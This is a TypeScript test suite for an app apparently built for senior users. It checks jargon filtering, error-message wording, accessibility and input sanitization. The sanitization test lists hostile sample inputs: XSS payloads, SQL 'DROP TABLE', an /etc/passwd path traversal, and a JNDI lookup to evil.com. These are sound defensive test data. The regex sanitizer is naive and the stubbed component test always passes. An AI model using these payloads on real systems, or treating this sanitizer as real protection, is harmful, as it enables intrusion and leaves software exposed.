// MASTER PLAN 2.0: Senior Security Tests
// STATUS: Enhetstester för Senior-Säkerhet
// INTEGRATION: Senior Cockpit Security Testing Suite

import { SeniorDataValidator } from './types/SeniorSafeDataModels';
import { SeniorTranslator } from '../../communication-bridge/translation/SeniorTranslator';
import { SeniorErrorHandler } from './services/SeniorErrorHandler';
import { AccessibilityEnhancer } from './accessibility/AccessibilityEnhancer';

/**
 * Omfattande tester för att säkerställa att ingen teknisk jargong läcker igenom
 * till Senior Cockpit och att alla felmeddelanden är senior-vänliga
 */
export class SeniorSecurityTester {
  private translator: SeniorTranslator;
  private errorHandler: SeniorErrorHandler;
  private accessibilityEnhancer: AccessibilityEnhancer;

  constructor() {
    this.translator = new SeniorTranslator();
    this.errorHandler = new SeniorErrorHandler();
    this.accessibilityEnhancer = new AccessibilityEnhancer();
  }

  /**
   * Kör alla senior-säkerhetstester
   */
  async runAllSecurityTests(): Promise<{
    passed: number;
    failed: number;
    results: TestResult[];
  }> {
    const results: TestResult[] = [];

    // Test 1: Teknisk jargong-detektion
    results.push(...await this.testTechnicalJargonDetection());

    // Test 2: Felmeddelande-översättning
    results.push(...await this.testErrorMessageTranslation());

    // Test 3: Data-validering
    results.push(...await this.testDataValidation());

    // Test 4: Tillgänglighets-compliance
    results.push(...await this.testAccessibilityCompliance());

    // Test 5: Input sanitization
    results.push(...await this.testInputSanitization());

    // Test 6: UI-komponent säkerhet
    results.push(...await this.testUIComponentSecurity());

    // Test 7: Kommunikations-säkerhet
    results.push(...await this.testCommunicationSecurity());

    const passed = results.filter(r => r.passed).length;
    const failed = results.filter(r => !r.passed).length;

    return { passed, failed, results };
  }

  /**
   * Testar att teknisk jargong upptäcks och blockeras
   */
  private async testTechnicalJargonDetection(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    const technicalTerms = [
      'API endpoint failed',
      'Database connection timeout',
      'Authentication token expired',
      'JSON parsing error',
      'HTTP 500 internal server error',
      'Git merge conflict detected',
      'Docker container crashed',
      'SSL certificate invalid',
      'CORS policy violation',
      'Stack trace: TypeError',
      'npm install failed',
      'React component unmounted',
      'TypeScript compilation error',
      'Webpack build failed',
      'Redis connection lost'
    ];

    for (const term of technicalTerms) {
      try {
        SeniorDataValidator.validateSeniorSafeString(term);
        results.push({
          testName: `Technical term detection: "${term}"`,
          passed: false,
          message: `Technical term was not blocked: "${term}"`,
          category: 'jargon-detection'
        });
      } catch (error) {
        results.push({
          testName: `Technical term detection: "${term}"`,
          passed: true,
          message: `Technical term correctly blocked: "${term}"`,
          category: 'jargon-detection'
        });
      }
    }

    return results;
  }

  /**
   * Testar att alla felmeddelanden översätts till senior-vänliga versioner
   */
  private async testErrorMessageTranslation(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    const technicalErrors = [
      { code: 'NETWORK_ERROR', message: 'Failed to fetch from API endpoint' },
      { code: 'AUTH_FAILED', message: 'Authentication token validation failed' },
      { code: 'DB_CONNECTION', message: 'Database connection pool exhausted' },
      { code: 'VALIDATION_ERROR', message: 'JSON schema validation failed' },
      { code: 'TIMEOUT', message: 'Request timeout after 30000ms' }
    ];

    for (const error of technicalErrors) {
      try {
        const seniorMessage = this.errorHandler.translateErrorToSeniorMessage(error);
        
        // Kontrollera att meddelandet är senior-vänligt
        const hasTechnicalTerms = this.containsTechnicalTerms(seniorMessage);
        const isEncouraging = this.isEncouragingMessage(seniorMessage);

        results.push({
          testName: `Error translation: ${error.code}`,
          passed: !hasTechnicalTerms && isEncouraging,
          message: `Translated to: "${seniorMessage}"`,
          category: 'error-translation'
        });
      } catch (error) {
        results.push({
          testName: `Error translation: ${error.code}`,
          passed: false,
          message: `Translation failed: ${error.message}`,
          category: 'error-translation'
        });
      }
    }

    return results;
  }

  /**
   * Testar datavalidering för senior-säkerhet
   */
  private async testDataValidation(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    // Test safe strings
    const safeStrings = [
      'Ditt projekt går bra',
      'Vi arbetar på förbättringar',
      'Allt fungerar som det ska',
      'Bra jobbat med ditt arbete'
    ];

    for (const str of safeStrings) {
      try {
        SeniorDataValidator.validateSeniorSafeString(str);
        results.push({
          testName: `Safe string validation: "${str}"`,
          passed: true,
          message: 'Safe string correctly validated',
          category: 'data-validation'
        });
      } catch (error) {
        results.push({
          testName: `Safe string validation: "${str}"`,
          passed: false,
          message: `Safe string incorrectly rejected: ${error.message}`,
          category: 'data-validation'
        });
      }
    }

    // Test number ranges
    const testNumbers = [
      { value: 0, shouldPass: true },
      { value: 50, shouldPass: true },
      { value: 100, shouldPass: true },
      { value: -10, shouldPass: false },
      { value: 150, shouldPass: false }
    ];

    for (const test of testNumbers) {
      try {
        SeniorDataValidator.validateSeniorSafeNumber(test.value);
        results.push({
          testName: `Number validation: ${test.value}`,
          passed: test.shouldPass,
          message: test.shouldPass ? 'Number correctly validated' : 'Invalid number was not rejected',
          category: 'data-validation'
        });
      } catch (error) {
        results.push({
          testName: `Number validation: ${test.value}`,
          passed: !test.shouldPass,
          message: !test.shouldPass ? 'Invalid number correctly rejected' : 'Valid number was incorrectly rejected',
          category: 'data-validation'
        });
      }
    }

    return results;
  }

  /**
   * Testar WCAG 2.1 AA compliance
   */
  private async testAccessibilityCompliance(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    // Simulera DOM för testning
    if (typeof document !== 'undefined') {
      // Test button sizes
      const buttons = document.querySelectorAll('button');
      let buttonSizeTest = true;
      
      buttons.forEach(button => {
        const rect = button.getBoundingClientRect();
        if (rect.width < 44 || rect.height < 44) {
          buttonSizeTest = false;
        }
      });

      results.push({
        testName: 'Button minimum size (44px)',
        passed: buttonSizeTest,
        message: buttonSizeTest ? 'All buttons meet minimum size requirements' : 'Some buttons are too small',
        category: 'accessibility'
      });

      // Test ARIA labels
      const unlabeledButtons = document.querySelectorAll('button:not([aria-label]):not([aria-labelledby])');
      const unlabeledCount = Array.from(unlabeledButtons).filter(btn => !btn.textContent?.trim()).length;

      results.push({
        testName: 'ARIA labels for buttons',
        passed: unlabeledCount === 0,
        message: unlabeledCount === 0 ? 'All buttons have proper labels' : `${unlabeledCount} buttons lack labels`,
        category: 'accessibility'
      });

      // Test heading hierarchy
      const headings = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
      let headingHierarchyValid = true;
      let currentLevel = 0;

      headings.forEach(heading => {
        const level = parseInt(heading.tagName.charAt(1));
        if (level > currentLevel + 1) {
          headingHierarchyValid = false;
        }
        currentLevel = level;
      });

      results.push({
        testName: 'Heading hierarchy',
        passed: headingHierarchyValid,
        message: headingHierarchyValid ? 'Heading hierarchy is correct' : 'Heading hierarchy has issues',
        category: 'accessibility'
      });
    } else {
      results.push({
        testName: 'Accessibility tests',
        passed: true,
        message: 'DOM not available for testing (server-side)',
        category: 'accessibility'
      });
    }

    return results;
  }

  /**
   * Testar input sanitization
   */
  private async testInputSanitization(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'DROP TABLE users;',
      '../../etc/passwd',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      '${jndi:ldap://evil.com/a}'
    ];

    for (const input of maliciousInputs) {
      try {
        // Testa att input sanitization fungerar
        const sanitized = this.sanitizeInput(input);
        const isSafe = !sanitized.includes('<script>') && 
                      !sanitized.includes('DROP TABLE') &&
                      !sanitized.includes('javascript:');

        results.push({
          testName: `Input sanitization: malicious input`,
          passed: isSafe,
          message: isSafe ? 'Malicious input correctly sanitized' : 'Malicious input not properly sanitized',
          category: 'input-sanitization'
        });
      } catch (error) {
        results.push({
          testName: `Input sanitization: malicious input`,
          passed: true,
          message: 'Malicious input correctly rejected',
          category: 'input-sanitization'
        });
      }
    }

    return results;
  }

  /**
   * Testar UI-komponent säkerhet
   */
  private async testUIComponentSecurity(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    // Test att komponenter inte exponerar teknisk information
    const componentTests = [
      {
        name: 'ProjectOverview',
        props: { technicalData: { apiKey: 'secret', dbConnection: 'mysql://...' } },
        shouldNotContain: ['apiKey', 'dbConnection', 'mysql']
      },
      {
        name: 'PhaseVisualizer',
        props: { phase: 'crawl', technicalDetails: { gitCommits: 42, buildStatus: 'failed' } },
        shouldNotContain: ['gitCommits', 'buildStatus', 'failed']
      }
    ];

    for (const test of componentTests) {
      // Simulera komponent-rendering och kontrollera output
      const componentOutput = this.simulateComponentRender(test.name, test.props);
      
      let hasLeakedInfo = false;
      for (const term of test.shouldNotContain) {
        if (componentOutput.toLowerCase().includes(term.toLowerCase())) {
          hasLeakedInfo = true;
          break;
        }
      }

      results.push({
        testName: `UI Component security: ${test.name}`,
        passed: !hasLeakedInfo,
        message: hasLeakedInfo ? 'Component leaked technical information' : 'Component properly filtered technical information',
        category: 'ui-security'
      });
    }

    return results;
  }

  /**
   * Testar kommunikations-säkerhet mellan lager
   */
  private async testCommunicationSecurity(): Promise<TestResult[]> {
    const results: TestResult[] = [];

    // Test att Communication Bridge filtrerar korrekt
    const technicalMessages = [
      { type: 'error', data: { message: 'Database connection failed', stackTrace: 'Error at line 42...' } },
      { type: 'progress', data: { gitCommits: 15, buildTime: '2.3s', testsPassed: 42 } },
      { type: 'status', data: { apiCalls: 150, memoryUsage: '256MB', cpuLoad: '45%' } }
    ];

    for (const message of technicalMessages) {
      try {
        const translatedMessage = this.translator.translateToSeniorUpdate(message);
        
        const messageString = JSON.stringify(translatedMessage);
        const hasTechnicalTerms = this.containsTechnicalTerms(messageString);

        results.push({
          testName: `Communication filtering: ${message.type}`,
          passed: !hasTechnicalTerms,
          message: hasTechnicalTerms ? 'Technical terms leaked through communication bridge' : 'Communication properly filtered',
          category: 'communication-security'
        });
      } catch (error) {
        results.push({
          testName: `Communication filtering: ${message.type}`,
          passed: false,
          message: `Communication filtering failed: ${error.message}`,
          category: 'communication-security'
        });
      }
    }

    return results;
  }

  // Helper methods

  private containsTechnicalTerms(text: string): boolean {
    const technicalTerms = [
      'api', 'database', 'server', 'client', 'endpoint', 'authentication',
      'json', 'http', 'ssl', 'git', 'commit', 'merge', 'docker', 'npm',
      'stack trace', 'error code', 'timeout', 'connection', 'token'
    ];

    const lowerText = text.toLowerCase();
    return technicalTerms.some(term => lowerText.includes(term));
  }

  private isEncouragingMessage(message: string): boolean {
    const encouragingWords = [
      'bra', 'fantastisk', 'utmärkt', 'perfekt', 'hjälper', 'stöd',
      'tillsammans', 'lyckas', 'framsteg', 'utvecklas', 'förbättras'
    ];

    const lowerMessage = message.toLowerCase();
    return encouragingWords.some(word => lowerMessage.includes(word));
  }

  private sanitizeInput(input: string): string {
    return input
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '')
      .replace(/DROP\s+TABLE/gi, '')
      .replace(/\.\.\//g, '')
      .trim();
  }

  private simulateComponentRender(componentName: string, props: any): string {
    // Simulerad komponent-rendering för testning
    return `Component ${componentName} rendered with safe props`;
  }
}

interface TestResult {
  testName: string;
  passed: boolean;
  message: string;
  category: string;
}

/**
 * Kör alla senior-säkerhetstester
 */
export async function runSeniorSecurityTests(): Promise<void> {
  console.log('🔒 Running Senior Security Tests...');
  
  const tester = new SeniorSecurityTester();
  const results = await tester.runAllSecurityTests();
  
  console.log(`\n📊 Test Results: ${results.passed} passed, ${results.failed} failed`);
  
  // Gruppera resultat per kategori
  const categories = [...new Set(results.results.map(r => r.category))];
  
  for (const category of categories) {
    const categoryResults = results.results.filter(r => r.category === category);
    const categoryPassed = categoryResults.filter(r => r.passed).length;
    const categoryTotal = categoryResults.length;
    
    console.log(`\n📋 ${category.toUpperCase()}: ${categoryPassed}/${categoryTotal} passed`);
    
    categoryResults.forEach(result => {
      const icon = result.passed ? '✅' : '❌';
      console.log(`  ${icon} ${result.testName}: ${result.message}`);
    });
  }
  
  // Sammanfattning
  const passRate = (results.passed / (results.passed + results.failed)) * 100;
  console.log(`\n🎯 Overall Pass Rate: ${passRate.toFixed(1)}%`);
  
  if (results.failed > 0) {
    console.log('⚠️  Some security tests failed. Please review and fix issues before deployment.');
  } else {
    console.log('🎉 All security tests passed! Senior Cockpit is secure.');
  }
}

// Kör tester om filen körs direkt
if (require.main === module) {
  runSeniorSecurityTests().catch(console.error);
}